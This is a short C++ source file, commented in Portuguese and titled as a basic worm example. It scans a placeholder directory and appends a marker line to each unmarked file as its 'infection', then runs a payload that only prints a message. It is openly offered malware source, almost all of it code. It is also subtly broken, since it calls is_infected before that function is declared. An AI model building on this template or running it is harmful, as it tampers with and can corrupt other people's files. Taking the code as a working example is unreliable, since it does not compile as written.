/*

Exemplo básico de worm em c++

*/

#include <iostream>
#include <fstream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <dirent.h>

using namespace std;

void propagate() {
    // Define o diretório onde o worm buscará por arquivos para infectar
    const char* target_directory = "/caminho/para/diretorio/alvo";

    DIR* dir;
    struct dirent* entry;

    // Abre o diretório alvo
    if ((dir = opendir(target_directory)) == nullptr) {
        cout << "Falha ao abrir o diretório alvo\n";
        return;
    }

    // Lê cada entrada no diretório
    while ((entry = readdir(dir)) != nullptr) {
        string file_name = entry->d_name;
        string file_path = string(target_directory) + "/" + file_name;

        // Ignora diretórios e arquivos ocultos
        if (entry->d_type == DT_DIR || file_name[0] == '.') {
            continue;
        }

        // Verifica se o arquivo já está infectado
        if (!is_infected(file_path)) {
            // Infecta o arquivo adicionando código malicioso
            ofstream file(file_path, ios::app);
            if (file.is_open()) {
                file << "# Código malicioso adicionado pelo worm" << endl;
                file.close();
            }
        }
    }

    // Fecha o diretório
    closedir(dir);
}

bool is_infected(const string& file_path) {
    // Verifica se o arquivo está infectado procurando a presença de código malicioso
    ifstream file(file_path);
    if (file.is_open()) {
        string line;
        while (getline(file, line)) {
            if (line.find("# Código malicioso adicionado pelo worm") != string::npos) {
                return true;
            }
        }
        file.close();
    }
    return false;
}

void payload() {
    // Define a ação que o worm executará nos sistemas infectados
    // Neste exemplo, apenas exibiremos uma mensagem
    cout << "Payload executado em um sistema infectado\n";
}

int main() {
    // Propaga o worm
    propagate();

    // Executa a carga útil (payload) nos sistemas infectados
    payload();

    return 0;
}